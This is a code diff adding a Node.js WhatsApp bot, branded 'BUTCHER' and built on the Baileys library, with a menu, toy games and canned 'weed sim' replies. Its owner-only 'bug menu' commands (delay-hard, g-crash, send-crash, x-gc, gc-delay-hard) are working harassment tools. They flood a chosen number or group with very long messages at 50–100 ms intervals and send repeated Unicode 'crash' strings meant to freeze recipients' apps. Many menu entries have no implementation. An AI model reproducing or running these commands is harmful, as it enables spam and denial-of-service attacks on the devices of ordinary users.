@@ -1,0 +1,537 @@
+const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, downloadContentFromMessage } = require('@whiskeysockets/baileys')
+const pino = require('pino')
+const readline = require('readline')
+const fs = require('fs')
+const crypto = require('crypto')
+const axios = require('axios')
+
+const rl = readline.createInterface({ input: process.stdin, output: process.stdout })
+const question = (text) => new Promise((resolve) => rl.question(text, resolve))
+
+const PREFIX = '.'
+const CONFIG_FILE = './config.json'
+const MENU_MEDIA_FILE = './menu_media.jpg'
+const startTime = Date.now()
+
+let config = { owner: null, mode: 'private', menuMediaUrl: null }
+if (fs.existsSync(CONFIG_FILE)) {
+    config = JSON.parse(fs.readFileSync(CONFIG_FILE))
+}
+
+const saveConfig = () => fs.writeFileSync(CONFIG_FILE, JSON.stringify(config, null, 2))
+
+const formatUptime = (ms) => {
+    let sec = Math.floor(ms / 1000)
+    let min = Math.floor(sec / 60)
+    let hr = Math.floor(min / 60)
+    let day = Math.floor(hr / 24)
+    return `${day}d ${hr%24}h ${min%60}m ${sec%60}s`
+}
+
+const getSystemInfo = () => {
+    const now = new Date()
+    const date = now.toLocaleDateString('en-US', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' })
+    const time = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false })
+    const uptime = formatUptime(Date.now() - startTime)
+    
+    return { date, time, uptime }
+}
+
+const animals = ['Lion','Wolf','Owl','Fox','Eagle','Dolphin','Tiger','Panda']
+const countries = ['Japan','Brazil','Canada','Egypt','Italy','Kenya','Australia','France']
+const colors = ['Red','Blue','Green','Yellow','Purple','Orange','Pink','Black']
+const crashChars = '𝙶𝙷𝙶𝙷𝙶𝙷𝚣𝚣𝚣𝚣𝚣𝚣💥💥💥'
+
+const getMenuMedia = async () => {
+    try {
+        if (fs.existsSync(MENU_MEDIA_FILE)) {
+            return fs.readFileSync(MENU_MEDIA_FILE)
+        }
+        
+        if (config.menuMediaUrl) {
+            const response = await axios.get(config.menuMediaUrl, { responseType: 'arraybuffer' })
+            return Buffer.from(response.data, 'binary')
+        }
+        
+        const randomId = Math.floor(Math.random() * 1000)
+        const url = `https://picsum.photos/300/400?random=${randomId}`
+        const response = await axios.get(url, { responseType: 'arraybuffer' })
+        return Buffer.from(response.data, 'binary')
+    } catch (e) {
+        console.error('Error fetching media:', e)
+        return null
+    }
+}
+
+async function startBot() {
+    const { state, saveCreds } = await useMultiFileAuthState('auth')
+    const sock = makeWASocket({ auth: state, logger: pino({ level: 'silent' }), printQRInTerminal: true })
+
+    if (!sock.authState.creds.registered) {
+        const phoneNumber = await question('Enter number with country code 27604180862: ')
+        const code = await sock.requestPairingCode(phoneNumber.replace(/[^0-9]/g, ''))
+        console.log(`\nPairing code: ${code}\n`)
+    }
+
+    sock.ev.on('connection.update', ({ connection, lastDisconnect }) => {
+        if (connection === 'close') {
+            const reconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut
+            if (reconnect) startBot()
+        } else if (connection === 'open') {
+            console.log('✅ Bot online!')
+        }
+    })
+
+    sock.ev.on('creds.update', saveCreds)
+
+    sock.ev.on('messages.upsert', async ({ messages, type }) => {
+        if (type !== 'notify') return
+        const msg = messages[0]
+        if (!msg.message || msg.key.fromMe) return
+
+        const from = msg.key.remoteJid
+        const sender = msg.key.participant || msg.key.remoteJid
+        const text = msg.message.conversation || msg.message.extendedTextMessage?.text || ''
+        const isGroup = from.endsWith('@g.us')
+
+        if (!text.startsWith(PREFIX)) return
+        const args = text.slice(PREFIX.length).trim().split(/\s+/)
+        const cmd = args.shift().toLowerCase()
+
+        if (!config.owner) {
+            config.owner = sender
+            saveConfig()
+            console.log(`✅ Owner set to: ${sender}`)
+        }
+
+        const isOwner = sender === config.owner
+        if (config.mode === 'private' && !isOwner) {
+            return sock.sendMessage(from, { text: 'Bot is private rn. Only owner can use it.' })
+        }
+
+        const reply = (msg) => sock.sendMessage(from, { text: msg + `\n\n_Powered by BUTCHER 🫆_` })
+
+        try {
+            switch(cmd) {
+                case 'menu':
+                    const info = getSystemInfo()
+                    const menuText = `ʜᴇʟʟᴏ @⁨†Butcher†⁩
+
+ᴅᴀᴛᴇ: ${info.date}
+ᴛɪᴍᴇ: ${info.time}
+ᴜᴘᴛɪᴍᴇ: ${info.uptime}
+
+☣︎ *ᴀɪ ᴄʜᴀᴛ*
+\`\`\`.bible\`\`\`
+\`\`\`.aivoice ⓒ\`\`\`
+\`\`\`.chatbot ⓒ\`\`\`
+\`\`\`.gpt ⓒ\`\`\`
+
+☣︎ *ᴀɪ ɪᴍᴀɢᴇꜱ*
+\`\`\`.flux ⓒ\`\`\`
+\`\`\`.gammy ⓒ\`\`\`
+\`\`\`.magicstudio ⓒ\`\`\`
+\`\`\`.mix-ai ⓒ\`\`\`
+\`\`\`.stabilityai ⓒ\`\`\`
+\`\`\`.stable-diffusion ⓒ\`\`\`
+
+☣︎ *ᴄᴏɴᴠᴇʀᴛᴇʀ*
+\`\`\`.bass ⓒ\`\`\`
+\`\`\`.chipmunk ⓒ\`\`\`
+\`\`\`.chorus ⓒ\`\`\`
+\`\`\`.deep ⓒ\`\`\`
+\`\`\`.distortion ⓒ\`\`\`
+\`\`\`.earrape ⓒ\`\`\`
+\`\`\`.echo ⓒ\`\`\`
+\`\`\`.eightd ⓒ\`\`\`
+\`\`\`.fast ⓒ\`\`\`
+\`\`\`.flanger ⓒ\`\`\`
+\`\`\`.high ⓒ\`\`\`
+\`\`\`.karaoke ⓒ\`\`\`
+\`\`\`.low ⓒ\`\`\`
+\`\`\`.night ⓒ\`\`\`
+\`\`\`.nightcore ⓒ\`\`\`
+\`\`\`.phaser ⓒ\`\`\`
+\`\`\`.reverb ⓒ\`\`\`
+\`\`\`.reverse ⓒ\`\`\`
+\`\`\`.robot ⓒ\`\`\`
+\`\`\`.slow ⓒ\`\`\`
+\`\`\`.smooth ⓒ\`\`\`
+\`\`\`.tremolo ⓒ\`\`\`
+\`\`\`.tremolo2 ⓒ\`\`\`
+\`\`\`.vibrato ⓒ\`\`\`
+\`\`\`.img-blur ⓒ\`\`\`
+\`\`\`.img-grayscale ⓒ\`\`\`
+\`\`\`.img-night ⓒ\`\`\`
+\`\`\`.img-sharpen ⓒ\`\`\`
+\`\`\`.stake ⓒ\`\`\`
+\`\`\`.sticker ⓒ\`\`\`
+\`\`\`.toimg ⓒ\`\`\`
+\`\`\`.tovid ⓒ\`\`\`
+\`\`\`.tovn ⓒ\`\`\`
+\`\`\`.v-blur ⓒ\`\`\`
+\`\`\`.v-fast ⓒ\`\`\`
+\`\`\`.v-grayscale ⓒ\`\`\`
+\`\`\`.v-mirror ⓒ\`\`\`
+\`\`\`.v-night ⓒ\`\`\`
+\`\`\`.v-reverse ⓒ\`\`\`
+\`\`\`.v-sharpen ⓒ\`\`\`
+\`\`\`.v-slow ⓒ\`\`\`
+\`\`\`.v-smooth ⓒ\`\`\`
+
+☣︎ *ᴅᴏᴡɴʟᴏᴀᴅᴇʀ*
+\`\`\`.fbdl ⓒ\`\`\`
+\`\`\`.igdl ⓒ\`\`\`
+\`\`\`.mfdl ⓒ\`\`\`
+\`\`\`.play ⓒ\`\`\`
+\`\`\`.spdl ⓒ\`\`\`
+\`\`\`.ttdl ⓒ\`\`\`
+\`\`\`.twdl ⓒ\`\`\`
+\`\`\`.ytvid ⓒ\`\`\`
+
+☣︎ *ᴇᴄᴏɴᴏᴍʏ*
+\`\`\`.inv ⓒ\`\`\`
+\`\`\`.myinv ⓒ\`\`\`
+\`\`\`.use-item ⓒ\`\`\`
+\`\`\`.balance ⓒ\`\`\`
+\`\`\`.bank ⓒ\`\`\`
+\`\`\`.beg ⓒ\`\`\`
+\`\`\`.work ⓒ\`\`\`
+\`\`\`.give ⓒ\`\`\`
+\`\`\`.stats ⓒ\`\`\`
+
+☣︎ *ɢᴀᴍᴇ*
+\`\`\`.blackjack ⓒ\`\`\`
+\`\`\`.coinflip ⓒ\`\`\`
+\`\`\`.crash ⓒ\`\`\`
+\`\`\`.dice ⓒ\`\`\`
+\`\`\`.diceduel ⓒ\`\`\`
+\`\`\`.dorn ⓒ\`\`\`
+\`\`\`.higherlower ⓒ\`\`\`
+\`\`\`.lottery ⓒ\`\`\`
+\`\`\`.roulette ⓒ\`\`\`
+\`\`\`.slot ⓒ\`\`\`
+\`\`\`.slots ⓒ\`\`\`
+\`\`\`.uno ⓒ\`\`\`
+
+☣︎ *ᴘʀᴏꜰɪʟᴇ*
+\`\`\`.dono-stats ⓒ\`\`\`
+\`\`\`.top-dono ⓒ\`\`\`
+\`\`\`.afk ⓒ\`\`\`
+\`\`\`.claim\`\`\`
+\`\`\`.coin ⓒ\`\`\`
+\`\`\`.leaderboard ⓒ\`\`\`
+\`\`\`.profile ⓒ\`\`\`
+\`\`\`.reset ⓒ\`\`\`
+
+☣︎ *ᴛᴏᴏʟ*
+\`\`\`.animeinfo ⓒ\`\`\`
+\`\`\`.fetch ⓒ\`\`\`
+\`\`\`.gimage ⓒ\`\`\`
+\`\`\`.lyrics ⓒ\`\`\`
+\`\`\`.weather ⓒ\`\`\`
+
+☣︎ *ɢʀᴏᴜᴘ*
+\`\`\`.admins Ⓖ\`\`\`
+\`\`\`.groupinfo Ⓖ\`\`\`
+\`\`\`.link Ⓖ\`\`\`
+\`\`\`.kick Ⓖ\`\`\`
+\`\`\`.promote Ⓖ\`\`\`
+\`\`\`.demote Ⓖ\`\`\`
+
+☣︎ *ᴡᴇᴇᴅ ꜱɪᴍ*
+\`\`\`.weedfarm ⓒ\`\`\`
+\`\`\`.myhouse ⓒ\`\`\`
+\`\`\`.weedbuyplot ⓒ\`\`\`
+\`\`\`.weedcook ⓒ\`\`\`
+\`\`\`.weedgather ⓒ\`\`\`
+\`\`\`.weedinv ⓒ\`\`\`
+\`\`\`.weedsell ⓒ\`\`\`
+\`\`\`.weedtrade ⓒ\`\`\`
+
+☣︎ *ᴘɪɴɢ & ɪɴꜰᴏ*
+\`\`\`.ping ⓒ\`\`\`
+\`\`\`.uptime ⓒ\`\`\`
+\`\`\`.owner ⓒ\`\`\`
+\`\`\`.public ⓞ\`\`\`
+\`\`\`.private ⓞ\`\`\`
+
+☣︎ *🐛 ʙᴜɢ ᴍᴇɴᴜ* (Owner Only)
+\`\`\`.delay-hard <number> <duration>\`\`\`
+\`\`\`.g-crash <group_id> <duration>\`\`\`
+\`\`\`.send-crash <target>\`\`\`
+\`\`\`.x-gc\`\`\`
+\`\`\`.gc-delay-hard <duration>\`\`\`
+\`\`\`.setmedia <url>\`\`\`
+\`\`\`.pong ⓞ\`\`\`
+
+_Powered by BUTCHER 🫆_`
+
+                    try {
+                        const media = await getMenuMedia()
+                        if (media) {
+                            await sock.sendMessage(from, {
+                                image: media,
+                                caption: menuText
+                            })
+                        } else {
+                            await sock.sendMessage(from, { text: menuText })
+                        }
+                    } catch (e) {
+                        console.error('Menu error:', e)
+                        await sock.sendMessage(from, { text: menuText })
+                    }
+                    break
+
+                case 'setmedia':
+                    if(!isOwner) return await reply('Owner only')
+                    const mediaUrl = args[0]
+                    if(!mediaUrl) return await reply('Usage: .setmedia <image_url>')
+                    
+                    try {
+                        const response = await axios.get(mediaUrl, { responseType: 'arraybuffer' })
+                        fs.writeFileSync(MENU_MEDIA_FILE, Buffer.from(response.data, 'binary'))
+                        config.menuMediaUrl = mediaUrl
+                        saveConfig()
+                        await reply(`✅ Menu image set!`)
+                    } catch(e) {
+                        console.error(e)
+                        await reply('❌ Failed to download image')
+                    }
+                    break
+
+                // === FUN ===
+                case 'character':
+                    await reply(`Your character: ${animals[Math.floor(Math.random()*animals.length)]}`)
+                    break
+                case 'randomcolor':
+                    await reply(`Color: ${colors[Math.floor(Math.random()*colors.length)]}`)
+                    break
+                case 'randomcountry':
+                    await reply(`Country: ${countries[Math.floor(Math.random()*countries.length)]}`)
+                    break
+                case 'luckynumber':
+                    await reply(`Lucky number: ${Math.floor(Math.random()*100)+1}`)
+                    break
+
+                case 'reverse':
+                    await reply(args.join(' ').split('').reverse().join(''))
+                    break
+
+                // === GAMES ===
+                case 'dice':
+                    await reply(`🎲 You rolled: ${Math.floor(Math.random()*6)+1}`)
+                    break
+                case 'rng':
+                    const min = parseInt(args[0])||1
+                    const max = parseInt(args[1])||100
+                    await reply(`Random: ${Math.floor(Math.random()*(max-min+1))+min}`)
+                    break
+                case 'coinflip':
+                    await reply(`Coin: ${Math.random() > 0.5 ? 'Heads 🪙' : 'Tails 🪙'}`)
+                    break
+                case 'slot':
+                    const slot1 = Math.floor(Math.random()*6)
+                    const slot2 = Math.floor(Math.random()*6)
+                    const slot3 = Math.floor(Math.random()*6)
+                    const slotEmojis = ['🍎','🍌','🍇','🍓','🍒','💰']
+                    await reply(`${slotEmojis[slot1]} ${slotEmojis[slot2]} ${slotEmojis[slot3]}\n${slot1 === slot2 && slot2 === slot3 ? 'JACKPOT! 🎉' : 'Try again'}`)
+                    break
+                case 'blackjack':
+                    await reply(`🎰 Blackjack: ${Math.floor(Math.random()*21)+1}`)
+                    break
+                case 'crash':
+                    await reply(`📉 Crash: ${Math.random().toFixed(2)}x`)
+                    break
+                case 'roulette':
+                    await reply(`🎡 Roulette: ${Math.floor(Math.random()*36)+1}`)
+                    break
+                case 'lottery':
+                    await reply(`🎫 Lottery: ${Math.floor(Math.random()*1000000)+1}`)
+                    break
+                case 'diceduel':
+                    await reply(`🎲 Duel: You: ${Math.floor(Math.random()*6)+1} vs Bot: ${Math.floor(Math.random()*6)+1}`)
+                    break
+                case 'dorn':
+                    await reply(`Dorn: ${Math.random() > 0.5 ? 'You Win! 🎉' : 'You Lose'}`)
+                    break
+                case 'higherlower':
+                    await reply(`${Math.random() > 0.5 ? 'Higher ⬆️' : 'Lower ⬇️'}`)
+                    break
+                case 'slots':
+                    await reply(`🎰 Slots: ${Math.random() > 0.5 ? 'WIN!' : 'LOSE'}`)
+                    break
+                case 'uno':
+                    await reply('🃏 UNO started!')
+                    break
+
+                // === WEED SIM ===
+                case 'weedfarm':
+                    await reply('🌿 Weed Farm: You harvested 50g!')
+                    break
+                case 'myhouse':
+                    await reply('🏠 Your house: Worth $50,000')
+                    break
+                case 'weedbuyplot':
+                    await reply('🌱 Plot purchased for $10,000')
+                    break
+                case 'weedcook':
+                    await reply('👨‍🍳 Cooking weed... Done! 100g ready')
+                    break
+                case 'weedgather':
+                    await reply('🌾 Gathered 75g of weed')
+                    break
+                case 'weedinv':
+                    await reply('📦 Weed Inventory: 500g')
+                    break
+                case 'weedsell':
+                    await reply('💰 Sold 200g for $5,000')
+                    break
+                case 'weedtrade':
+                    await reply('🤝 Trade completed!')
+                    break
+
+                // === SYSTEM ===
+                case 'ping':
+                    const s = Date.now()
+                    await sock.sendMessage(from, {text:'Pong!'})
+                    await reply(`Speed: ${Date.now()-s}ms`)
+                    break
+                case 'uptime':
+                    const systemInfo = getSystemInfo()
+                    await reply(`Uptime: ${systemInfo.uptime}`)
+                    break
+                case 'owner':
+                    await reply(`Owner: @${config.owner.split('@')[0]}`)
+                    break
+                case 'public':
+                    if(!isOwner) return await reply('Owner only')
+                    config.mode='public'
+                    saveConfig()
+                    await reply('Mode: public 🔓')
+                    break
+                case 'private':
+                    if(!isOwner) return await reply('Owner only')
+                    config.mode='private'
+                    saveConfig()
+                    await reply('Mode: private 🔒')
+                    break
+
+                // === BUGS ===
+                case 'delay-hard':
+                    if(!isOwner) return await reply('Owner only')
+                    const targetNumber = args[0]
+                    const durationSeconds = parseInt(args[1])
+                    if(!targetNumber || !durationSeconds) return await reply('Usage: .delay-hard <number> <duration>')
+                    
+                    const messageText = 'ᕦ⁠(⁠ ⁠⊡⁠ ⁠益⁠ ⊡⁠ ⁠)⁠ᕤ'.repeat(Math.ceil(5005 / 'ᕦ⁠(⁠ ⁠⊡⁠ ⁠益⁠ ⊡⁠ ⁠)⁠ᕤ'.length))
+                    const endTime = Date.now() + (durationSeconds * 1000)
+                    
+                    await reply(`poison sent ${targetNumber} for ${durationSeconds}s! 😈`)
+                    
+                    while(Date.now() < endTime) {
+                        try {
+                            await sock.sendMessage(targetNumber, { text: messageText })
+                            await new Promise(r => setTimeout(r, 100))
+                        } catch(e) {
+                            break
+                        }
+                    }
+                    
+                    await reply(`Poison sent! `)
+                    break
+
+                case 'g-crash':
+                    if(!isOwner) return await reply('Owner only')
+                    const groupId = args[0]
+                    const groupDurationSeconds = parseInt(args[1])
+                    if(!groupId || !groupDurationSeconds) return await reply('Usage: .g-crash <group_id> <duration>')
+                    
+                    const groupMessageText = 'ᕦ⁠(⁠ ⁠⊡⁠ ⁠益⁠ ⊡⁠ ⁠)⁠ᕤ'.repeat(Math.ceil(5005 / 'ᕦ⁠(⁠ ⁠⊡⁠ ⁠益⁠ ⊡⁠ ⁠)⁠ᕤ'.length))
+                    const groupEndTime = Date.now() + (groupDurationSeconds * 1000)
+                    
+                    await reply(`Group prank started for ${groupDurationSeconds}s! 😈`)
+                    
+                    while(Date.now() < groupEndTime) {
+                        try {
+                            await sock.sendMessage(groupId, { text: groupMessageText })
+                            await new Promise(r => setTimeout(r, 100))
+                        } catch(e) {
+                            break
+                        }
+                    }
+                    
+                    await reply(`Group poison! `)
+                    break
+
+                case 'send-crash':
+                    if(!isOwner) return await reply('Owner only')
+                    const targetCrash = args[0]
+                    if(!targetCrash) return await reply('Usage: .send-crash <target>')
+                    
+                    try {
+                        const crashMessage = crashChars.repeat(50) + '\n' + 'ᐯ'.repeat(100)
+                        await sock.sendMessage(targetCrash, { text: crashMessage })
+                        await reply(`Crash sent to ${targetCrash}! 💥`)
+                    } catch(e) {
+                        await reply('Error sending crash')
+                    }
+                    break
+
+                case 'x-gc':
+                    if(!isOwner) return await reply('Owner only')
+                    if(!isGroup) return await reply('Use this in a group!')
+                    
+                    try {
+                        const singleCrash = crashChars.repeat(100) + '\nBUTCHER'
+                        await sock.sendMessage(from, { text: singleCrash })
+                    } catch(e) {
+                        await reply('Error')
+                    }
+                    break
+
+                case 'gc-delay-hard':
+                    if(!isOwner) return await reply('Owner only')
+                    if(!isGroup) return await reply('Use this in a group!')
+                    
+                    const gcDuration = parseInt(args[0])
+                    if(!gcDuration) return await reply('Usage: .gc-delay-hard <duration>')
+                    
+                    try {
+                        const gcEndTime = Date.now() + (gcDuration * 1000)
+                        let statusCount = 0
+                        
+                        await reply(`GC poison ${gcDuration}s! 💥`)
+                        
+                        while(Date.now() < gcEndTime) {
+                            const statusMessage = `🔴 STATUS ${statusCount++}\n${crashChars.repeat(75)}\nBUTCHER`
+                            try {
+                                await sock.sendMessage(from, { text: statusMessage })
+                                await new Promise(r => setTimeout(r, 50))
+                            } catch(e) {
+                                break
+                            }
+                        }
+                        
+                        await reply(`Sent ${statusCount} messages! 💣`)
+                    } catch(e) {
+                        await reply('Error')
+                    }
+                    break
+
+                case 'pong':
+                    if(!isOwner) return await reply('Owner only')
+                    await reply('Ping!')
+                    break
+
+                default:
+                    await reply(`Command .${cmd} not recognized. Type .menu for commands.`)
+            }
+        } catch(e) {
+            console.error(e)
+            await reply('Error occurred.')
+        }
+    })
+}
+
+startBot()
